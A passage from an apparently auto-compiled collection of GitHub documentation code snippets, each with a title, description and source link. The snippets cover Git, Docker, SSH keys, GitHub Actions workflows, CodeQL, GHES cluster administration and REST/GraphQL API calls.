plugin's help documentation within the Vim/Neovim environment, providing information on how to use the plugin. This command requires the Copilot plugin to be installed and properly configured in Vim/Neovim.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/getting-code-suggestions-in-your-ide-with-github-copilot.md#_snippet_10\n\nLANGUAGE: shell\nCODE:\n```\n:help copilot\n```\n\n----------------------------------------\n\nTITLE: Listing Committers from Mercurial Repository in Shell\nDESCRIPTION: This shell command extracts a unique, sorted list of committers from a Mercurial repository and stores them in a `committers.txt` file.  It uses `hg log` to retrieve commit logs, extracts the author using the template, sorts the authors, removes duplicates using `uniq`, and redirects the output to the `committers.txt` file.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/importing-source-code/using-the-command-line-to-import-source-code/importing-a-mercurial-repository.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nhg log --template \"{author}\\n\" | sort | uniq > committers.txt\n```\n\n----------------------------------------\n\nTITLE: Publishing a Docker image\nDESCRIPTION: This command publishes a Docker image to the GitHub Packages registry. It requires the OWNER, REPOSITORY, IMAGE_NAME and VERSION to be specified. This command is used for github.com.\nSOURCE: https://github.com/github/docs/blob/main/content/packages/working-with-a-github-packages-registry/working-with-the-docker-registry.md#_snippet_7\n\nLANGUAGE: Shell\nCODE:\n```\ndocker push docker.pkg.github.com/OWNER/REPOSITORY/IMAGE_NAME:VERSION\n```\n\n----------------------------------------\n\nTITLE: Troubleshooting Bad Credentials - Shell\nDESCRIPTION: This snippet shows the error message encountered when there's an issue with stored account credentials in GitHub Desktop. The suggested solution is to sign out and then sign back in.\nSOURCE: https://github.com/github/docs/blob/main/content/desktop/installing-and-authenticating-to-github-desktop/authenticating-to-github-in-github-desktop.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nError: Bad credentials\n```\n\n----------------------------------------\n\nTITLE: Generating a new SSH key for a hardware security key - Linux - Shell\nDESCRIPTION: This command generates a new SSH key specifically for a hardware security key using the ed25519-sk algorithm and associates it with the provided email address.  It requires a hardware security key inserted into the computer.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\nssh-keygen -t ed25519-sk -C \"your_email@example.com\"\n```\n\n----------------------------------------\n\nTITLE: Path Qualifier with Quoted String\nDESCRIPTION: This snippet shows how to search for a filename which contains a special character like `*` or `?` by using a quoted string in the `path:` qualifier. It will only match paths containing the literal string `file?`.\nSOURCE: https://github.com/github/docs/blob/main/content/search-github/github-code-search/understanding-github-code-search-syntax.md#_snippet_20\n\nLANGUAGE: text\nCODE:\n```\npath:\"file?\"\n```\n\n----------------------------------------\n\nTITLE: Installing GnuCOBOL on Ubuntu/Debian with apt\nDESCRIPTION: This set of commands updates the apt package list and installs the GnuCOBOL compiler on Ubuntu or Debian-based systems. This allows users to compile and run the legacy COBOL code before modernization.\nSOURCE: https://github.com/github/docs/blob/main/content/copilot/using-github-copilot/guides-on-using-github-copilot/modernizing-legacy-code-with-github-copilot.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nsudo apt-get update && \\\nsudo apt-get install gnucobol\n```\n\n----------------------------------------\n\nTITLE: Installing pinentry-mac - Shell\nDESCRIPTION: This snippet installs `pinentry-mac` using Homebrew and configures GPG agent to use it, allowing the system to prompt for a PIN or passphrase when required for GPG operations. It also restarts the gpg-agent.  This is designed for macOS.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/managing-commit-signature-verification/telling-git-about-your-signing-key.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nbrew install pinentry-mac\necho \"pinentry-program $(which pinentry-mac)\" >> ~/.gnupg/gpg-agent.conf\nkillall gpg-agent\n```\n\n----------------------------------------\n\nTITLE: Versioning Image Based on Plan with Liquid\nDESCRIPTION: This snippet demonstrates how to use Liquid conditionals to display different images based on the GitHub plan (Free, Pro, Team, Enterprise Cloud vs. GHES). It checks if the version is `fpt` (Free, Pro, Team) or `ghec` (Enterprise Cloud) and displays a corresponding image path. Otherwise, it defaults to an image path specific to GHES.\nSOURCE: https://github.com/github/docs/blob/main/content/contributing/writing-for-github-docs/creating-screenshots.md#_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n{% raw %}\n{% ifversion fpt or ghec %}\n![An image of foo bar for GitHub Free, GitHub Pro, GitHub Team, and GitHub Enterprise Cloud](/assets/images/foo/bar.png)\n{% else %}\n![An image of foo bar for GHES](/assets/images/enterprise/foo/bar.png)\n{% endif %}{% endraw %}\n```\n\n----------------------------------------\n\nTITLE: Accessing Response Data from Octokit\nDESCRIPTION: This snippet demonstrates how to access the data, status, URL, and headers from a response object returned by Octokit. It shows how to retrieve the issue title and rate limit information.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/guides/scripting-with-the-rest-api-and-ruby.md#_snippet_15\n\nLANGUAGE: ruby\nCODE:\n```\nresponse = octokit.request(\"GET /repos/{owner}/{repo}/issues/{issue_number}\", owner: \"github\", repo: \"docs\", issue_number: 11901)\n puts \"The status of the response is: #{response.status}\"\n puts \"The request URL was: #{response.url}\"\n puts \"The x-ratelimit-remaining response header is: #{response.headers['x-ratelimit-remaining']}\"\n puts \"The issue title is: #{response.data['title']}\"\n```\n\n----------------------------------------\n\nTITLE: Backing Up EFI Boot Partition\nDESCRIPTION: This command backs up the existing EFI boot partition to a file named `EFIBOOT.bak` before reformatting the disk with a GUID partition table. This is crucial for instances created from GHES 3.14 and later.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_4\n\nLANGUAGE: Shell\nCODE:\n```\nsudo dd if=/dev/disk/by-label/EFIBOOT of=EFIBOOT.bak bs=1M\n```\n\n----------------------------------------\n\nTITLE: Parsing JSON with jq\nDESCRIPTION: This snippet uses `jq` to parse the `data.json` file (created in the previous step) and extract the `title` and `authorID` of each issue. The `jq` expression iterates through the JSON array and creates a new object with only the desired fields. `jq` needs to be installed separately.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/using-the-rest-api/getting-started-with-the-rest-api.md#_snippet_17\n\nLANGUAGE: shell\nCODE:\n```\njq '.[] | {title: .title, authorID: .user.id}' data.json\n```\n\n----------------------------------------\n\nTITLE: Quoting Text in Markdown\nDESCRIPTION: This code snippet shows how to quote text in Markdown using the '>' symbol. Quoted text is displayed with indentation and a vertical line on the left.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax.md#_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\nText that is not a quote\n\n> Text that is a quote\n```\n\n----------------------------------------\n\nTITLE: Attaching the Data Disk to the VM in PowerShell\nDESCRIPTION: This PowerShell command attaches the newly created data disk to the virtual machine. Replace VM_NAME with the name of the VM and PATH_TO_DATA_DISK with the path to the VHD file.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-hyper-v.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\nPS C:\\> Add-VMHardDiskDrive -VMName VM_NAME -Path PATH_TO_DATA_DISK\n```\n\n----------------------------------------\n\nTITLE: Interactive rebase editor content (example)\nDESCRIPTION: This snippet shows the content of the interactive rebase editor. It specifies which commits to pick or edit during the rebase process. The user changes `pick` to `edit` to modify a specific commit.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/secret-scanning/working-with-secret-scanning-and-push-protection/working-with-push-protection-from-the-command-line.md#_snippet_2\n\nLANGUAGE: text\nCODE:\n```\nedit 8728dbe67 my second commit message\npick 03d69e5d3 my third commit message\npick 8053f7b27 my fourth commit message\n```\n\n----------------------------------------\n\nTITLE: Setting Node TTL for 'warn' State (nes set-node-ttl warn)\nDESCRIPTION: This command sets the TTL for the `warn` state of a node in minutes. This value should be lower than the TTL for the `fail` state.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_55\n\nLANGUAGE: shell\nCODE:\n```\nnes set-node-ttl warn TIME\n```\n\n----------------------------------------\n\nTITLE: Listing GitHub Enterprise Server images on GCP using gcloud\nDESCRIPTION: This command lists the public GitHub Enterprise Server images available on Google Cloud Platform using the gcloud compute command-line tool. It filters the images to only show those from the `github-enterprise-public` project and excludes standard images.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-google-cloud-platform.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\ngcloud compute images list --project github-enterprise-public --no-standard-images\n```\n\n----------------------------------------\n\nTITLE: Configuring GitHub Actions Importer\nDESCRIPTION: This code snippet demonstrates how to configure the GitHub Actions Importer using the `gh actions-importer configure` command. It prompts the user for credentials such as the GitHub PAT, Travis CI API token, and base URLs for both platforms. The configuration is essential for the tool to interact with Travis CI and GitHub.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/using-github-actions-importer-to-automate-migrations/migrating-from-travis-ci-with-github-actions-importer.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ngh actions-importer configure\n```\n\n----------------------------------------\n\nTITLE: Concurrency: Cancel Any In-Progress Run\nDESCRIPTION: This YAML snippet cancels any in-progress run of the workflow, without defining a specific concurrency group. The group is dynamically set to the current git ref, and cancel-in-progress is true. This configuration effectively ensures only one run of the workflow can be active at a time.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/actions-group-concurrency.md#_snippet_4\n\nLANGUAGE: yaml\nCODE:\n```\nconcurrency:\n  group: ${{ github.ref }}\n  cancel-in-progress: true\n```\n\n----------------------------------------\n\nTITLE: Identifying Fork Owner and Repository\nDESCRIPTION: This command identifies the owner and repository name (NWO) of a fork. NWO must be replaced with the actual NWO value.\nSOURCE: https://github.com/github/docs/blob/main/content/authentication/keeping-your-account-and-data-secure/removing-sensitive-data-from-a-repository.md#_snippet_9\n\nLANGUAGE: shell\nCODE:\n```\nghe-nwo NWO\n```\n\n----------------------------------------\n\nTITLE: Validating ID Format in YAML Issue Form\nDESCRIPTION: This example demonstrates the \"body[i]: `id` can only contain numbers, letters, -, _\" error. It occurs when the `id` attribute contains characters other than alphanumeric characters, hyphens, and underscores. The corrected example shows a valid `id` attribute with only permitted characters.\nSOURCE: https://github.com/github/docs/blob/main/content/communities/using-templates-to-encourage-useful-issues-and-pull-requests/common-validation-errors-when-creating-issue-forms.md#_snippet_13\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: input\n  id: first name\n  attributes:\n    label: First name\n```\n\nLANGUAGE: yaml\nCODE:\n```\nname: \"Bug report\"\nbody:\n- type: input\n  id: first-name\n  attributes:\n    label: First name\n```\n\n----------------------------------------\n\nTITLE: Listing Groups via SCIM REST API\nDESCRIPTION: This snippet represents the HTTP GET request used to list all groups defined for an enterprise in GitHub using the SCIM API. This endpoint returns a list of provisioned SCIM groups for the enterprise.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/managing-iam/provisioning-user-accounts-with-scim/provisioning-users-and-groups-with-scim-using-the-rest-api.md#_snippet_1\n\nLANGUAGE: HTTP\nCODE:\n```\nGET /scim/v2/{% ifversion ghec %}enterprises/{enterprise}/{% endif %}Groups\n```\n\n----------------------------------------\n\nTITLE: Checking Partition Table Type\nDESCRIPTION: This command checks whether the partition table type is GUID (gpt) or legacy (msdos). The output `gpt` or `msdos` determines which procedure to follow for increasing the root partition size.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/updating-the-virtual-machine-and-physical-resources/increasing-storage-capacity.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\nsudo lsblk -no pttype $(findmnt -no source /)\n```\n\n----------------------------------------\n\nTITLE: Updating Project Settings using GraphQL with curl\nDESCRIPTION: This snippet demonstrates updating a project's settings using the GitHub GraphQL API and `curl`. It requires replacing `PROJECT_ID` with the node ID of the project. You can also set the `public` flag, `readme`, and `shortDescription` for the project. The API key is passed in the `Authorization` header.\nSOURCE: https://github.com/github/docs/blob/main/content/issues/planning-and-tracking-with-projects/automating-your-project/using-the-api-to-manage-projects.md#_snippet_19\n\nLANGUAGE: shell\nCODE:\n```\ncurl --request POST \\\n--url https://api.github.com/graphql \\\n--header 'Authorization: Bearer TOKEN' \\\n--data '{\"query\":\"mutation { updateProjectV2(input: { projectId: \\\"PROJECT_ID\\\", title: \\\"Project title\\\", public: false, readme: \\\"# Project README\\n\\nA long description\\\", shortDescription: \\\"A short description\\\"}) { projectV2 { id, title, readme, shortDescription }}}\"}'\n```\n\n----------------------------------------\n\nTITLE: Checking cluster health using nes get-cluster-health\nDESCRIPTION: This snippet shows how to check the cluster's health using the `nes get-cluster-health` command. This confirms the target node is eligible.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/monitoring-the-health-of-your-cluster-nodes-with-node-eligibility-service.md#_snippet_13\n\nLANGUAGE: shell\nCODE:\n```\nnes get-cluster-health\n```\n\n----------------------------------------\n\nTITLE: Init Container for Volume Ownership Change - YAML\nDESCRIPTION: This YAML snippet demonstrates using an `initContainer` to change the ownership of a mounted volume to resolve permission issues. It runs a `chown` command before the runner container starts. This approach is useful when updating the `securityContext` is not a viable solution.  The user and group ID in the `chown` command should be adjusted to match the runner's user.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors.md#_snippet_6\n\nLANGUAGE: yaml\nCODE:\n```\ntemplate:\nspec:\n    initContainers:\n    - name: kube-init\n    image: ghcr.io/actions/actions-runner:latest\n    command: [\"sudo\", \"chown\", \"-R\", \"1001:123\", \"/home/runner/_work\"]\n    volumeMounts:\n        - name: work\n        mountPath: /home/runner/_work\n    containers:\n    - name: runner\n    image: ghcr.io/actions/actions-runner:latest\n    command: [\"/home/runner/run.sh\"]\n```\n\n----------------------------------------\n\nTITLE: Displaying Backticks Within Code Blocks in Text\nDESCRIPTION: Explains how to display triple backticks within a fenced code block by wrapping them inside quadruple backticks. This is useful when you need to show the literal backtick characters in your code examples.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/writing-on-github/working-with-advanced-formatting/creating-and-highlighting-code-blocks.md#_snippet_1\n\nLANGUAGE: text\nCODE:\n```\n````\n```\nLook! You can see my backticks.\n```\n````\n```\n\n----------------------------------------\n\nTITLE: Sending a Support Bundle to GitHub Support (Shell)\nDESCRIPTION: Sends a support bundle to GitHub Support using the `ghe-support-bundle` utility with the `-u` option.  Requires SSH access to the GitHub Enterprise Server appliance as the `admin` user.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/administering-your-instance/administering-your-instance-from-the-command-line/command-line-utilities.md#_snippet_93\n\nLANGUAGE: shell\nCODE:\n```\nssh -p 122 admin@HOSTNAME -- 'ghe-support-bundle -u'\n```\n\n----------------------------------------\n\nTITLE: Start an Organization Migration with POST Request (Shell)\nDESCRIPTION: This snippet demonstrates how to start an organization migration using a POST request to the GitHub Migrations API endpoint. It requires an access token for authentication and a list of repositories to migrate. The `lock_repositories` parameter is set to `true` to lock the repositories before migration.\nSOURCE: https://github.com/github/docs/blob/main/content/migrations/using-ghe-migrator/exporting-migration-data-from-githubcom.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncurl -H \"Authorization: Bearer GITHUB_ACCESS_TOKEN\" \\\n-X POST \\\n-H \"Accept: application/vnd.github+json\" \\\n-d'{\"lock_repositories\":true,\"repositories\":[\"ORG_NAME/REPO_NAME\", \"ORG_NAME/REPO_NAME\"]}' \\\nhttps://api.github.com/orgs/ORG_NAME/migrations\n```\n\n----------------------------------------\n\nTITLE: Opening a port on a GitHub Enterprise Server VM on Azure - Shell\nDESCRIPTION: This command opens a specific port on a virtual machine (VM) on Azure. It's used to configure the security settings by allowing network traffic through the specified port. The `az vm open-port` command requires the VM name, resource group, and port number as parameters.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/installing-your-enterprise-server/setting-up-a-github-enterprise-server-instance/installing-github-enterprise-server-on-azure.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\naz vm open-port -n VM_NAME -g RESOURCE_GROUP --port PORT_NUMBER\n```\n\n----------------------------------------\n\nTITLE: Multi-OS Build: Jenkins Pipeline (YAML)\nDESCRIPTION: Configures a Jenkins pipeline to run tests on multiple operating systems ('macos', 'linux') using the `matrix` block. It installs Node.js version 20 and executes bats tests within each OS environment.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/migrating-to-github-actions/manually-migrating-to-github-actions/migrating-from-jenkins-to-github-actions.md#_snippet_6\n\nLANGUAGE: YAML\nCODE:\n```\npipeline {\n  agent none\n  stages {\n    stage('Run Tests') {\n      matrix {\n        axes {\n          axis {\n            name: 'PLATFORM'\n            values: 'macos', 'linux'\n          }\n        }\n        agent { label \"${PLATFORM}\" }\n        stages {\n          stage('test') {\n            tools { nodejs \"node-20\" }\n            steps {\n              dir(\"scripts/myapp\") {\n                sh(script: \"npm install -g bats\")\n                sh(script: \"bats tests\")\n              }\n            }\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Querying Nodes with Cluster Role using curl\nDESCRIPTION: This snippet uses `curl` to query nodes with specific cluster roles. It authenticates as the root site administrator and filters the response to include nodes with either the `web-server` or `storage-server` role.  Replace `ROOT-SITE-ADMINISTRATOR-PASSWORD` and `ADMINISTRATION-PORT` with appropriate values.\nSOURCE: https://github.com/github/docs/blob/main/content/rest/enterprise-admin/manage-ghes.md#_snippet_2\n\nLANGUAGE: shell\nCODE:\n```\ncurl -L -u \"api_key:ROOT-SITE-ADMINISTRATOR-PASSWORD\" 'http(s)://HOSTNAME:ADMINISTRATION-PORT/manage/v1/config/nodes?cluster_role=WebServer,StorageServer'\n```\n\n----------------------------------------\n\nTITLE: Defining Matrix with OS and Version YAML\nDESCRIPTION: This snippet demonstrates how to define a matrix strategy in a GitHub Actions workflow to run jobs for different combinations of operating systems (`os`) and versions. It also shows how to use the `include` keyword to add a specific configuration with `windows-latest` as the OS and `17` as the version. This configuration is appended to the automatically generated matrix.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/actions/jobs/matrix-add-with-include.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\njobs:\n  example_matrix:\n    strategy:\n      matrix:\n        os: [macos-latest, windows-latest, ubuntu-latest]\n        version: [12, 14, 16]\n        include:\n          - os: windows-latest\n            version: 17\n```\n\n----------------------------------------\n\nTITLE: Converting Jupyter Notebook to HTML\nDESCRIPTION: This snippet shows how to convert a Jupyter Notebook file (.ipynb) to a static HTML file using the `nbconvert` command-line tool. This conversion allows viewing the notebook's content without requiring a Jupyter server.\nSOURCE: https://github.com/github/docs/blob/main/content/repositories/working-with-files/using-files/working-with-non-code-files.md#_snippet_3\n\nLANGUAGE: Shell\nCODE:\n```\njupyter nbconvert --to html NOTEBOOK-NAME.ipynb\n```\n\n----------------------------------------\n\nTITLE: Set GitHub PAT Environment Variable in PowerShell\nDESCRIPTION: This snippet demonstrates how to set the GitHub Personal Access Token (PAT) as an environment variable named `GH_PAT` in a PowerShell environment. It uses the `$env` command, which allows setting environment variables within the PowerShell session. Replace `TOKEN` with the actual PAT value.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/enterprise-migration-tool/grant-migrator-role-pat.md#_snippet_1\n\nLANGUAGE: PowerShell\nCODE:\n```\n$env:GH_PAT=\"TOKEN\"\n```\n\n----------------------------------------\n\nTITLE: Creating CodeQL Database for C/C++ Project with Make\nDESCRIPTION: This snippet demonstrates how to create a CodeQL database for a C/C++ project built using `make`.  It disables parallel execution to ensure proper tracing. It relies on `codeql` CLI being installed and available in the system's PATH.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_8\n\nLANGUAGE: shell\nCODE:\n```\n# Disable parallel execution via `-j1` or other techniques: https://www.gnu.org/software/make/manual/make.html#Parallel-Execution\ncodeql database create cpp-database --language=c-cpp --command=make\n```\n\n----------------------------------------\n\nTITLE: Forwarding Webhooks with Smee.io (Shell)\nDESCRIPTION: This command forwards webhooks from a Smee.io webhook proxy URL to a local server for testing purposes.  It requires the `smee-client` package to be installed globally or locally via `npx`. Replace `WEBHOOK_PROXY_URL` with the actual URL provided by Smee.io.\nSOURCE: https://github.com/github/docs/blob/main/content/apps/creating-github-apps/writing-code-for-a-github-app/building-a-github-app-that-responds-to-webhook-events.md#_snippet_6\n\nLANGUAGE: shell\nCODE:\n```\nnpx smee -u WEBHOOK_PROXY_URL -t http://localhost:3000/api/webhook\n```\n\n----------------------------------------\n\nTITLE: Display settings.json content (Bash)\nDESCRIPTION: This bash command is used to display the content of the `settings.json` file located in the specified path within the codespace. The output allows verification of whether the port forwarding configuration has been correctly written by {% data variables.product.prodname_github_codespaces %}. Requires a bash terminal in the codespace.\nSOURCE: https://github.com/github/docs/blob/main/data/reusables/codespaces/troubleshooting-simple-browser.md#_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ncat ~/.vscode-remote/data/Machine/settings.json\n```\n\n----------------------------------------\n\nTITLE: Resolve QL pack dependencies\nDESCRIPTION: This shell command resolves dependencies for a QL pack located in the specified directory.  It searches configured registries for required dependencies and returns a list of resolved dependencies.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/codeql-cli-manual/pack-resolve-dependencies.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\ncodeql pack resolve-dependencies <options>... -- <dir>\n```\n\n----------------------------------------\n\nTITLE: Cluster Configuration Example - cluster.conf - Shell\nDESCRIPTION: This example defines the `cluster.conf` file structure for a GitHub Enterprise Server cluster. It specifies the hostname, IPv4 address, and roles (e.g., web-server, mysql-server, elasticsearch-server, git-server) for each node in the cluster, which include front-end nodes, database nodes, search nodes, and storage nodes. The `mysql-master` and `redis-master` settings define the primary database node.\nSOURCE: https://github.com/github/docs/blob/main/content/admin/monitoring-and-managing-your-instance/configuring-clustering/initializing-the-cluster.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\n[cluster]\n  mysql-master = ghes-database-node-1\n  redis-master = ghes-database-node-1\n  primary-datacenter = primary\n[cluster \"ghes-front-end-node-1\"]\n  hostname = ghes-front-end-node-1\n  ipv4 = 192.168.0.2\n  # ipv6 = fd12:3456:789a:1::2\n  consul-datacenter = primary\n  datacenter = primary\n  web-server = true\n  job-server = true\n  memcache-server = true\n[cluster \"ghes-front-end-node-2\"]\n  hostname = ghes-front-end-node-2\n  ipv4 = 192.168.0.3\n  # ipv6 = fd12:3456:789a:1::3\n  consul-datacenter = primary\n  datacenter = primary\n  web-server = true\n  job-server = true\n  memcache-server = true\n[cluster \"ghes-database-node-1\"]\n  hostname = ghes-database-node-1\n  ipv4 = 192.168.0.4\n  # ipv6 = fd12:3456:789a:1::4\n  consul-datacenter = primary\n  datacenter = primary\n  consul-server = true\n  mysql-server = true\n  redis-server = true\n[cluster \"ghes-database-node-2\"]\n  hostname = ghes-database-node-2\n  ipv4 = 192.168.0.5\n  # ipv6 = fd12:3456:789a:1::5\n  consul-datacenter = primary\n  datacenter = primary\n  consul-server = true\n  mysql-server = true\n  redis-server = true\n[cluster \"ghes-database-node-3\"]\n  hostname = ghes-database-node-3\n  ipv4 = 192.168.0.6\n  # ipv6 = fd12:3456:789a:1::6\n  consul-datacenter = primary\n  datacenter = primary\n  consul-server = true\n  mysql-server = true\n  redis-server = true\n[cluster \"ghes-search-node-1\"]\n  hostname = ghes-search-node-1\n  ipv4 = 192.168.0.7\n  # ipv6 = fd12:3456:789a:1::7\n  consul-datacenter = primary\n  datacenter = primary\n  elasticsearch-server = true\n[cluster \"ghes-search-node-2\"]\n  hostname = ghes-search-node-2\n  ipv4 = 192.168.0.8\n  # ipv6 = fd12:3456:789a:1::8\n  consul-datacenter = primary\n  datacenter = primary\n  elasticsearch-server = true\n[cluster \"ghes-search-node-3\"]\n  hostname = ghes-search-node-3\n  ipv4 = 192.168.0.9\n  # ipv6 = fd12:3456:789a:1::9\n  consul-datacenter = primary\n  datacenter = primary\n  elasticsearch-server = true\n[cluster \"ghes-storage-node-1\"]\n  hostname = ghes-storage-node-1\n  ipv4 = 192.168.0.10\n  # ipv6 = fd12:3456:789a:1::10\n  consul-datacenter = primary\n  datacenter = primary\n  git-server = true\n  pages-server = true\n  storage-server = true\n  metrics-server = true\n[cluster \"ghes-storage-node-2\"]\n  hostname = ghes-storage-node-2\n  ipv4 = 192.168.0.11\n  # ipv6 = fd12:3456:789a:1::11\n  consul-datacenter = primary\n  datacenter = primary\n  git-server = true\n  pages-server = true\n  storage-server = true\n  metrics-server = true\n[cluster \"ghes-storage-node-3\"]\n  hostname = ghes-storage-node-3\n  ipv4 = 192.168.0.12\n  # ipv6 = fd12:3456:789a:1::12\n  consul-datacenter = primary\n  datacenter = primary\n  git-server = true\n  pages-server = true\n  storage-server = true\n  metrics-server = true\n```\n\n----------------------------------------\n\nTITLE: Specifying a Single Query in a CodeQL Suite (YAML)\nDESCRIPTION: This YAML snippet shows how to specify a single query file to include in a CodeQL query suite. The path to the query file is specified relative to the CodeQL pack containing the suite definition. The query instruction tells CodeQL to look for a specific `.ql` file.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/using-the-advanced-functionality-of-the-codeql-cli/creating-codeql-query-suites.md#_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\n- query: <path-to-query>\n```\n\n----------------------------------------\n\nTITLE: Starting a New Git Repository and Publishing to GitHub\nDESCRIPTION: This snippet outlines the steps to initialize a new Git repository, create an initial file, stage and commit it, add a remote origin pointing to the GitHub repository, and push the changes to GitHub. It assumes the user has created an empty repository (without a README) on GitHub.  Replace `YOUR-USERNAME/YOUR-REPOSITORY-NAME` with your actual GitHub username and repository name.\nSOURCE: https://github.com/github/docs/blob/main/content/get-started/using-git/about-git.md#_snippet_2\n\nLANGUAGE: Bash\nCODE:\n```\n# create a new directory, and initialize it with git-specific functions\ngit init my-repo\n\n# change into the `my-repo` directory\ncd my-repo\n\n# create the first file in the project\ntouch README.md\n\n# git isn't aware of the file, stage it\ngit add README.md\n\n# take a snapshot of the staging area\ngit commit -m \"add README to initial commit\"\n\n# provide the path for the repository you created on github\ngit remote add origin https://github.com/YOUR-USERNAME/YOUR-REPOSITORY-NAME.git\n\n# push changes to github\ngit push --set-upstream origin main\n```\n\n----------------------------------------\n\nTITLE: Initializing CodeQL database with indirect tracing in YAML\nDESCRIPTION: This task initializes a CodeQL database for C# using indirect build tracing within an Azure DevOps pipeline. It specifies the language, trace process name, source root, and instructs CodeQL to begin tracing. It assumes that the CodeQL CLI is downloaded and accessible on the PATH.\nSOURCE: https://github.com/github/docs/blob/main/content/code-security/codeql-cli/getting-started-with-the-codeql-cli/preparing-your-code-for-codeql-analysis.md#_snippet_22\n\nLANGUAGE: yaml\nCODE:\n```\nsteps:\n    # Download the {% data variables.product.prodname_codeql_cli %} and query packs...\n    # Check out the repository ...\n\n    # Run any pre-build tasks, for example, restore NuGet dependencies...\n\n    # Initialize the {% data variables.product.prodname_codeql %} database.\n    # In this example, the {% data variables.product.prodname_codeql_cli %} has been downloaded and placed on the PATH.\n    - task: CmdLine@1\n       displayName: Initialize {% data variables.product.prodname_codeql %} database\n      inputs:\n          # Assumes the source code is checked out to the current working directory.\n          # Creates a database at `<current working directory>/db`.\n          # Running on Windows, so specifies a trace process level.\n          script: \"codeql database init --language csharp --trace-process-name Agent.Worker.exe --source-root . --begin-tracing db\"\n```\n\n----------------------------------------\n\nTITLE: Clean Up Keychain and Provisioning Profile on Self-Hosted Runners\nDESCRIPTION: This YAML snippet demonstrates a workflow step that cleans up the keychain and provisioning profile on self-hosted runners. It deletes the temporary keychain and removes the provisioning profile from the `~/Library/MobileDevice/Provisioning Profiles` directory. It's crucial for security to prevent sensitive data from persisting on self-hosted runners after the job completes. The `if: ${{ always() }}` ensures the step runs even if previous steps fail.\nSOURCE: https://github.com/github/docs/blob/main/content/actions/use-cases-and-examples/deploying/installing-an-apple-certificate-on-macos-runners-for-xcode-development.md#_snippet_3\n\nLANGUAGE: yaml\nCODE:\n```\n- name: Clean up keychain and provisioning profile\n  if: ${{ always() }}\n  run: |\n    security delete-keychain $RUNNER_TEMP/app-signing.keychain-db\n    rm ~/Library/MobileDevice/Provisioning\\ Profiles/build_pp.mobileprovision\n```\n\n----------------------------------------\n\nTITLE: Defining RepositoryDiscussionAuthor interface in GraphQL\nDESCRIPTION: Defines the `RepositoryDiscussionAuthor` interface, which is implemented by `User` and `Organization` types. It provides a `repositoryDiscussions` field for retrieving discussions started by the author. It includes arguments for pagination, filtering by answered status, ordering, and filtering by repository ID.\nSOURCE: https://github.com/github/docs/blob/main/content/graphql/guides/using-the-graphql-api-for-discussions.md#_snippet_12\n\nLANGUAGE: GraphQL\nCODE:\n```\n\"\"\"\nRepresents an author of discussions in repositories.\n\"\"\"\ninterface RepositoryDiscussionAuthor {\n  \"\"\"\n  Discussions this user has started.\n  \"\"\"\n  repositoryDiscussions(\n    \"\"\"\n    Returns the elements in the list that come after the specified cursor.\n    \"\"\"\n    after: String\n\n    \"\"\"\n    Filter discussions to only those that have been answered or not. Defaults to\n    including both answered and unanswered discussions.\n    \"\"\"\n    answered: Boolean = null\n\n    \"\"\"\n    Returns the elements in the list that come before the specified cursor.\n    \"\"\"\n    before: String\n\n    